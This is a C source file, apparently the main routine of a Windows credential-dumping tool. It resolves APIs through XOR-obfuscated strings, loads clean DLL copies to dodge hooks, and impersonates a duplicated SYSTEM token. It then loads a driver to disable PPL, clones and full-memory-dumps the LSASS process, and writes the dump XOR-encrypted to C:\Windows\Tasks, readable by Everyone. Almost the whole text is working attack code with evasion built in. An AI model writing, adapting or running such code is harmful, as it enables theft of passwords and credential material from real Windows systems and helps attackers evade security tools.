char* xor_encrypt_buffer(const unsigned char* buffer, size_t len, const char* key, size_t key_len) {
    char* result = (char*)malloc(len);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = buffer[i] ^ key[i % key_len];
    }
    return result;
}

// ==================================
// main
// ==================================

int main(void)
{
    // Logs
    logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");

    // Disabling buffering
    setvbuf(logfile, NULL, _IONBF, 0);

    // Resolving API
    
    // Load clean versions of DLLs
    char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
    HMODULE hKernel32 = LoadCleanDLL(kernel32Path);

    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HMODULE hNtdll = LoadCleanDLL(ntdllPath);

    char* advapi32Path = "C:\\Windows\\System32\\advapi32.dll";
    HMODULE hAdvapi32 = LoadCleanDLL(advapi32Path);

    char* dbghelpPath = "C:\\Windows\\System32\\dbghelp.dll";
    HMODULE hDbghelp = LoadCleanDLL(dbghelpPath);

    char* kernelbasePath = "C:\\Windows\\System32\\kernelbase.dll";
    HMODULE hKernelbase = LoadCleanDLL(kernelbasePath);
    //HMODULE hKernelbase = GetModuleHandleA("kernelbase.dll");

    if (!hKernel32 || !hNtdll || !hAdvapi32 || !hDbghelp || !hKernelbase) {
        printf("[!] Failed to load one or more DLLs\n");
        return 1;
    }

    // Process32First
    char* strP32F = (char*)malloc(sizeof(P32F_ENC));
    memcpy(strP32F, P32F_ENC, sizeof(P32F_ENC));
    strP32F = xor_decrypt_string((unsigned char*)strP32F, sizeof(P32F_ENC), XOR_KEY, key_len);
    pP32F = (PFN_P32F)CustomGetProcAddress(hKernel32, strP32F);
    // fprintf(logfile, "[*] pP32F (Process32First) @ %p\n", pP32F);
    SecureZeroMemory(strP32F, sizeof(P32F_ENC)); free(strP32F);

    // Process32Next
    char* strP32N = (char*)malloc(sizeof(P32N_ENC));
    memcpy(strP32N, P32N_ENC, sizeof(P32N_ENC));
    strP32N = xor_decrypt_string((unsigned char*)strP32N, sizeof(P32N_ENC), XOR_KEY, key_len);
    pP32N = (PFN_P32N)CustomGetProcAddress(hKernel32, strP32N);
    // fprintf(logfile, "[*] pP32N (Process32Next) @ %p\n", pP32N);
    SecureZeroMemory(strP32N, sizeof(P32N_ENC)); free(strP32N);

    // OpenProcess
    char* strOP = (char*)malloc(sizeof(OP_ENC));
    memcpy(strOP, OP_ENC, sizeof(OP_ENC));
    strOP = xor_decrypt_string((unsigned char*)strOP, sizeof(OP_ENC), XOR_KEY, key_len);
    pOP = (PFN_OP)GetProcAddress(hKernel32, strOP);
    // fprintf(logfile, "[*] pOP (OpenProcess) @ %p\n", pOP);
    SecureZeroMemory(strOP, sizeof(OP_ENC)); free(strOP);

    // GetProcAddress
    char* strGPA = (char*)malloc(sizeof(GPA_ENC));
    memcpy(strGPA, GPA_ENC, sizeof(GPA_ENC));
    strGPA = xor_decrypt_string((unsigned char*)strGPA, sizeof(GPA_ENC), XOR_KEY, key_len);
    pGPA = (PFN_GPA)CustomGetProcAddress(hKernel32, strGPA);
    // fprintf(logfile, "[*] pGPA (GetProcAddress) @ %p\n", pGPA);
    SecureZeroMemory(strGPA, sizeof(GPA_ENC)); free(strGPA);

    // NtCreateProcessEx
    char* strNTCPX = (char*)malloc(sizeof(NTCPE_ENC));
    memcpy(strNTCPX, NTCPE_ENC, sizeof(NTCPE_ENC));
    strNTCPX = xor_decrypt_string((unsigned char*)strNTCPX, sizeof(NTCPE_ENC), XOR_KEY, key_len);
    pNTCPX = (PFN_NTCPX)CustomGetProcAddress(hNtdll, strNTCPX);
    // fprintf(logfile, "[*] pNTCPX (NtCreateProcessEx) @ %p\n", pNTCPX);
    SecureZeroMemory(strNTCPX, sizeof(NTCPE_ENC)); free(strNTCPX);

    // CreateToolhelp32Snapshot
    char* strCTH = (char*)malloc(sizeof(CTH_ENC));
    memcpy(strCTH, CTH_ENC, sizeof(CTH_ENC));
    strCTH = xor_decrypt_string((unsigned char*)strCTH, sizeof(CTH_ENC), XOR_KEY, key_len);
    pCTH = (PFN_CTH)CustomGetProcAddress(hKernel32, strCTH);
    // fprintf(logfile, "[*] pCTH (CreateToolhelp32Snapshot) @ %p\n", pCTH);
    SecureZeroMemory(strCTH, sizeof(CTH_ENC)); free(strCTH);

    // OpenProcessToken
    char* strOPTK = (char*)malloc(sizeof(OPTK_ENC));
    memcpy(strOPTK, OPTK_ENC, sizeof(OPTK_ENC));
    strOPTK = xor_decrypt_string((unsigned char*)strOPTK, sizeof(OPTK_ENC), XOR_KEY, key_len);
    pOPTK = (PFN_OPTK)CustomGetProcAddress(hAdvapi32, strOPTK);
    // fprintf(logfile, "[*] pOPTK (OpenProcessToken) @ %p\n", pOPTK);
    SecureZeroMemory(strOPTK, sizeof(OPTK_ENC)); free(strOPTK);

    // DuplicateTokenEx
    char* strDUPTOK = (char*)malloc(sizeof(DUPTOK_ENC));
    memcpy(strDUPTOK, DUPTOK_ENC, sizeof(DUPTOK_ENC));
    strDUPTOK = xor_decrypt_string((unsigned char*)strDUPTOK, sizeof(DUPTOK_ENC), XOR_KEY, key_len);
    pDUPTOK = (PFN_DUPTOK)CustomGetProcAddress(hAdvapi32, strDUPTOK);
    // fprintf(logfile, "[*] pDUPTOK (DuplicateTokenEx) @ %p\n", pDUPTOK);
    SecureZeroMemory(strDUPTOK, sizeof(DUPTOK_ENC)); free(strDUPTOK);

    // ImpersonateLoggedOnUser
    char* strIMP = (char*)malloc(sizeof(IMP_ENC));
    memcpy(strIMP, IMP_ENC, sizeof(IMP_ENC));
    strIMP = xor_decrypt_string((unsigned char*)strIMP, sizeof(IMP_ENC), XOR_KEY, key_len);
    pIMP = (PFN_IMP)CustomGetProcAddress(hAdvapi32, strIMP);
    // fprintf(logfile, "[*] pIMP (ImpersonateLoggedOnUser) @ %p\n", pIMP);
    SecureZeroMemory(strIMP, sizeof(IMP_ENC)); free(strIMP);

    // SetThreadToken
    char* strSTT = (char*)malloc(sizeof(STT_ENC));
    memcpy(strSTT, STT_ENC, sizeof(STT_ENC));
    strSTT = xor_decrypt_string((unsigned char*)strSTT, sizeof(STT_ENC), XOR_KEY, key_len);
    pSTT = (PFN_STT)CustomGetProcAddress(hAdvapi32, strSTT);
    // fprintf(logfile, "[*] pSTT (SetThreadToken) @ %p\n", pSTT);
    SecureZeroMemory(strSTT, sizeof(STT_ENC)); free(strSTT);

    // AdjustTokenPrivileges
    char* strATP = (char*)malloc(sizeof(ATP_ENC));
    memcpy(strATP, ATP_ENC, sizeof(ATP_ENC));
    strATP = xor_decrypt_string((unsigned char*)strATP, sizeof(ATP_ENC), XOR_KEY, key_len);
    pATP = (PFN_ATP)CustomGetProcAddress(hAdvapi32, strATP);
    SecureZeroMemory(strATP, sizeof(ATP_ENC)); free(strATP);

    // LookupPrivilegeValueW
    char* strLPVA = (char*)malloc(sizeof(LPVA_ENC));
    memcpy(strLPVA, LPVA_ENC, sizeof(LPVA_ENC));
    strLPVA = xor_decrypt_string((unsigned char*)strLPVA, sizeof(LPVA_ENC), XOR_KEY, key_len);
    pLPVA = (PFN_LPVA)CustomGetProcAddress(hAdvapi32, strLPVA);
    SecureZeroMemory(strLPVA, sizeof(LPVA_ENC)); free(strLPVA);

    // MiniDumpWriteDump
    char* strMDWD = (char*)malloc(sizeof(MDWD_ENC));
    memcpy(strMDWD, MDWD_ENC, sizeof(MDWD_ENC));
    strMDWD = xor_decrypt_string((unsigned char*)strMDWD, sizeof(MDWD_ENC), XOR_KEY, key_len);
    pMDWD = (PFN_MDWD)CustomGetProcAddress(hDbghelp, strMDWD);
    SecureZeroMemory(strMDWD, sizeof(MDWD_ENC)); free(strMDWD);



    if (!pP32F || !pP32N || !pOP || !pGPA || !pNTCPX || !pCTH || !pOPTK || !pDUPTOK || !pIMP || !pSTT || !pATP || !pLPVA) {
        fprintf(logfile, "[ERROR] Failed to resolve one or more function pointers!\n");
        return 1;
    }
    
    // Initialize STARTUPINFO and PROCESS_INFORMATION structures.
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Duplicate SYSTEM token
    HANDLE hSystemToken = NULL;
    if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
        fprintf(logfile, "[!] Failed to duplicate SYSTEM token.\n");
        return 1;
    }
    fprintf(logfile, "[+] Successfully duplicated SYSTEM token.\n");    

    // Impersonate SYSTEM token
    if (!pIMP(hSystemToken)) {
        fprintf(logfile, "[!] ImpLogUsr failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logfile, "[+] Impersonation succeeded.\n");
    }

    if (!pSTT(NULL, hSystemToken)) {
        fprintf(logfile, "[!] STT failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logfile, "[+] STT succeeded. Current thread now uses SYSTEM token.\n");
    }

    // Start the driver
    LoadAndStartDriver();

    // Disable PPL
    disablePPL();

    HANDLE hTempFile = CreateFileA(
        "C:\\Windows\\Temp\\__tmpdump.dmp",  // O usa GetTempFileName
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hTempFile == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "[!] Failed to create temp file. Error: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hClone = CloneLsassProcess();
    DWORD clonedPID = GetProcessIdFromHandle(hClone);

    // Dump the target process
    BOOL dumped = pMDWD(
        hClone,               // Handle to target process
        clonedPID,              // Process ID
        hTempFile,                  // Handle to a buffer
        MiniDumpWithFullMemory, // Dump type
        NULL,                   // Exception parameter
        NULL,                   // User stream parameter
        NULL                    // Callback parameter
    );

    if (!dumped) {
        fprintf(logfile, "[!] Dump failed. Error: %lu\n", GetLastError());
        CloseHandle(hTempFile);
        return 1;
    }

    // Move file pointer to beginning
    SetFilePointer(hTempFile, 0, NULL, FILE_BEGIN);

    // Get file size
    DWORD fileSize = GetFileSize(hTempFile, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hTempFile, buffer, fileSize, &bytesRead, NULL);

    // XOR encrypt in memory
    char* encrypted = xor_encrypt_buffer(buffer, fileSize, XOR_KEY, strlen(XOR_KEY));
    free(buffer);
    CloseHandle(hTempFile); // Temp file gets deleted here automatically

    // Write encrypted buffer to actual file
    HANDLE dumpFilePath = CreateFileA("C:\\Windows\\Tasks\\xorred.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bytesWritten;
    WriteFile(dumpFilePath, encrypted, fileSize, &bytesWritten, NULL);
    CloseHandle(dumpFilePath);
    free(encrypted);

    fprintf(logfile, "[+] XOR'd dump written to C:\\Windows\\Tasks\\xorred.dmp\n");

    // Set file permissions to grant GENERIC_READ to Everyone
    DWORD dwRes;
    EXPLICIT_ACCESS ea;
    PACL pNewDACL = NULL;

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        fprintf(logfile, "Failed to set entries in ACL. Error: %lu\n", dwRes);
    }
    else
    {
        dwRes = SetNamedSecurityInfoA(
            (LPSTR)dumpFilePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL,
            NULL,
            pNewDACL,
            NULL);
        if (dwRes != ERROR_SUCCESS)
        {
            fprintf(logfile, "Failed to set security info. Error: %lu\n", dwRes);
        }
    }
    if (pNewDACL)
        LocalFree(pNewDACL);

    // Unload the driver
    StopAndUnloadDriver(DRIVER_NAME);

    fclose(logfile);

    return 0;
}
